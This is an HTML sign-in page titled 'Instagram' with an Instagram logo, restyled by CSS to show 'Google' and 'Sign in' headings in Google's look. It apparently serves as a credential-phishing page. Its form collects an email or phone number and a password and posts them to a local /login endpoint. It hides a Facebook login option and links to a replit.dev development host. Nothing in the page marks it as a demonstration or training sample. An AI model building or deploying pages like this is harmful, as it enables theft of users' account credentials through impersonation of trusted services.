<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Roboto, Arial, sans-serif;
    }

    body {
      background-color: #fff;
      color: #202124;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 40px 24px;
      text-align: left;
    }

    .logo {
      width: 75px;
      margin: 40px auto 20px;
      display: block;
      filter: none;
    }

    .container::before {
      content: "Google";
      display: block;
      text-align: center;
      font-size: 28px;
      font-weight: 500;
      margin-bottom: 10px;
      letter-spacing: -0.5px;
    }

    .container::after {
      content: "Sign in";
      display: block;
      text-align: center;
      font-size: 24px;
      margin-bottom: 10px;
    }

    form {
      margin-top: 30px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 12px;
      margin-top: 20px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      background: #fff;
      color: #202124;
    }

    input:focus {
      outline: none;
      border: 2px solid #1a73e8;
    }

    input::placeholder {
      color: #5f6368;
    }

    input[type="submit"] {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: auto;
      padding: 10px 24px;
      background-color: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-weight: 500;
      font-size: 14px;
      cursor: pointer;
    }

    input[type="submit"]:hover {
      background-color: #1669c1;
    }

    .divider,
    .facebook-login {
      display: none;
    }

    .forgot-password {
      display: block;
      margin-top: 12px;
      color: #1a73e8;
      font-size: 14px;
      text-decoration: none;
    }

    .footer {
      margin-top: 40px;
      font-size: 14px;
      color: #1a73e8;
    }

    .signup-link {
      color: #1a73e8;
      font-weight: 500;
      text-decoration: none;
    }

    .signup-link:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="container">
    <img src="instagram-text-icon.svg" alt="Instagram Text Logo" class="logo" />

    <form action="/login" method="POST">
      <input type="text" name="username" placeholder="Email or phone" required />
      <input type="password" name="passcode" placeholder="Enter your password" required />
      <input type="submit" value="Next" />
    </form>

    <div class="divider">OR</div>

    <a href="#" class="facebook-login">
      <img src="facebook-icon1.svg" alt="Facebook Logo" /> Log in with Facebook
    </a>

    <a href="#" class="forgot-password">Forgot email?</a>

    <div class="footer">
      Create account
      <a href="https://3039e9e2-3fcb-4591-9642-c447fc3ced90-00-1lclvursct2nf.sisko.replit.dev/" class="signup-link"></a>
    </div>
  </div>
</body>
</html>
